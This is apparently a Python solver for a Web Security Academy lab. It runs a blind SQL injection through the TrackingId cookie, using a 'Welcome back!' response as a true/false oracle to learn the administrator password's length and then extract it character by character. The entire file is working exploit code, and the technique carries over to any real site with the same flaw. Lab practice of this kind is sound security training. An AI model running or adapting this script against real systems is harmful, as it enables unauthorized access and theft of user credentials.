import string
import urllib.parse
import time
import requests
import sys
from bs4 import BeautifulSoup

# Adding this so I can use IntelliJ's play button.
# This value is only used if none is supplied from the command line.
MANUAL_CTF_URL = "https://ac6f1f941eeb2aa2c1b8165a00200036.web-security-academy.net/"
# Valid characters that will be used when finding the admin's password via SIMILAR TO with regex
VALID_CHARSET = string.ascii_lowercase + string.digits


# Helper functions
# -----------------

# Parse site URL
def getCtfUrl():
    try:
        site = sys.argv[1]
    except IndexError:
        site = MANUAL_CTF_URL
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')
    return f'https://{site}/'


# Use this after getting any http response to make sure that the CTF site hasn't timed out
def checkIfTimedOut(response):
    if response.status_code == 504:
        raise Exception("CTF site has timed out, refresh challenge.")


# Provided the query AND clause, returns a formatted sql injection query string
def buildQuery(and_clause):
    return f"x' UNION SELECT username FROM users WHERE username='administrator' AND {and_clause}--"


# try_query
# returns True when the query provided results in tricking the site backend by injecting a true statement
# a.k.a when the WHERE clause is true, try_query returns true.
def try_query(query):
    print(f'Query: {query}')
    my_cookies = {'TrackingId': urllib.parse.quote_plus(query)}
    resp = requests.get(url, cookies=my_cookies)
    checkIfTimedOut(resp)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False


# Moving pw length provided impl here so that the main portion of my script can
# more succinctly hold my own impl.
def getPasswordLength():
    num = 1
    while True:
        attempt_qry = buildQuery(and_clause=f'length(password)={num}')
        print(f'Trying length {num}')
        if not try_query(attempt_qry):
            num = num + 1
        else:
            break
    print(f"Password length is {num}")
    return num


if __name__ == "__main__":
    url = getCtfUrl()
    begin_time = time.perf_counter()

    # Plan:
    #   Get password length so we can use that to find out when to end password search
    #   Maintain string var holding the password that we know so far
    #   while length of that string is less than password length:
    #       for char in valid char set
    #           try query with and clause of: pw so far + new char attempt + '%'
    #           if that try returns true, append new char to pw so far, print pw so far, and break from for loop
    #   now pw so far should be the password, so outside of any loops just try a SIMILAR_TO query w/ that pw to confirm

    pw_length = getPasswordLength()
    hold_password = ""
    while len(hold_password) < pw_length:
        for char in VALID_CHARSET:
            qry = buildQuery(and_clause=f'password SIMILAR TO \'{hold_password+char+"%"}\'')
            if try_query(qry):
                hold_password = hold_password + char
                print(f'New char discovered; password so far: {hold_password}')
                break

    # Now just confirm that the above loop found the correct password:
    if try_query(buildQuery(and_clause=f'password SIMILAR TO \'{hold_password}\'')):
        print(f'Search complete...\n`administrator` password is: {hold_password}\n')
    else:
        print(f'Something went wrong: {hold_password} seems to be an incorrect password.\n')

    print(f"Time elapsed is {time.perf_counter() - begin_time} (seconds)")
